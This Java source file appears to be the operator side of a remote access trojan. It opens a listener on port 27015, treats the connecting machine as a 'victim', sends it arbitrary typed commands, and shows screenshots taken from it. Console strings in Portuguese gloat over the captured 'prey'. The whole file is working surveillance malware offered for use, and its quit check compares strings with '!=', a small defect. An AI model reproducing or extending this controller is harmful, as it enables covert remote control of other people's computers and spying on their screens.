import javax.imageio.ImageIO;
import javax.swing.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Objects;
import java.util.Scanner;

public class Server {

    private static ServerSocket serverSocket;

    public static void main(String[] args) {
        Scanner sc = new Scanner(System.in);
        try {
            serverSocket = new ServerSocket(27015);
            System.out.println("Podipa vamo esperar o gatao entrar");
            Socket clientSocket = serverSocket.accept();

            Connection victim = new Connection(clientSocket);
            System.out.println("Opa temos uma presa kkkkk de ip " + clientSocket.getInetAddress());

            String command;
            do {
                command = sc.nextLine();
                victim.sendMessage(new Message(command));
                Message message = victim.readMessage();
                String responseCommand = message.getCommand();

                if (Objects.equals(responseCommand, "screen")) { // opa chegou a screenshot fera
                    receiveScreenshot(message);
                }
                System.out.println(responseCommand);
                System.out.println("--------------------");
            } while (command != "quit");

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static void receiveScreenshot(Message message) {
        System.out.println("SCREENZAO CHEGOU HEIN");
        JFrame window = new JFrame("An Image On Screen");

        try {

            byte[] imageBytes = (byte[]) message.getArguments().get(0);
            InputStream in = new ByteArrayInputStream(imageBytes);
            BufferedImage bufferedImage = ImageIO.read(in);

            window.add(new ImageScreen(bufferedImage));

            window.setLocationRelativeTo(null);
            window.pack();
            window.setVisible(true);
        } catch (IOException e) {
            e.printStackTrace();
        }

    }
}
